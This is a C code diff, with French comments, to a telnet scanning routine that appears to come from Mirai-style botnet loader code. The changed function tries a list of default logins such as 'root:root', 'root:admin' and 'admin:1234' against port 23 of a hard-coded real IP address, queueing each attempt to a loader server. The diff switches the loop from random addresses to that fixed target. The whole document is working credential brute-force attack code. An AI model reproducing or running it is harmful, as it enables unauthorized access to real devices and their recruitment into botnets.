@@ -115,6 +115,7 @@ void auto_scan_random(void)
     
     // Liste des credentials à tester
     char *credentials[] = {
+        "root:root",
         "root:admin",
         "root:12345",
         "root:password",
@@ -130,7 +131,6 @@ void auto_scan_random(void)
         "root:abc123",
         "administrator:administrator",
         "admin:1234",
-        "root:root",
         "root:letmein",
         "admin:letmein",
         "root:master",
@@ -143,28 +143,24 @@ void auto_scan_random(void)
     int cred_count = sizeof(credentials) / sizeof(credentials[0]);
     
     srand(time(NULL));
-    printf("Testing ALL %d credentials for each IP\n", cred_count);
-    printf("Generating %d random IPs in 16.171.64.211\n\n", max_scans);
+    printf("Testing ALL %d credentials\n", cred_count);
+    printf("Target IP: 16.171.64.211\n\n");
     
-    for (int i = 0; i < max_scans; i++)
+    for (int c = 0; c < cred_count; c++)
     {
         char strbuf[128];
-        uint8_t o4 = (rand() % 254) + 1;
         
-        // Pour chaque IP, tester TOUS les credentials
-        for (int c = 0; c < cred_count; c++)
+        // IP fixe - pas de variable inutilisée
+        snprintf(strbuf, sizeof(strbuf), "16.171.64.211:23 %s", credentials[c]);
+        
+        memset(&info, 0, sizeof(struct telnet_info));
+        if (telnet_info_parse(strbuf, &info) != NULL)
         {
-            snprintf(strbuf, sizeof(strbuf), "16.171.64.211:23 %s", credentials[c]);
-            
-            memset(&info, 0, sizeof(struct telnet_info));
-            if (telnet_info_parse(strbuf, &info) != NULL)
-            {
-                server_queue_telnet(srv, &info);
-                total++;
-                printf("[%4d] Testing 16.171.64.211 with %s\n", 
-                       total, o4, credentials[c]);
-                usleep(10000); // 10ms pour être plus rapide (100 scans/sec)
-            }
+            server_queue_telnet(srv, &info);
+            total++;
+            printf("[%4d] Testing 16.171.64.211 with %s\n", 
+                   total, credentials[c]);
+            usleep(10000);
         }
     }
     
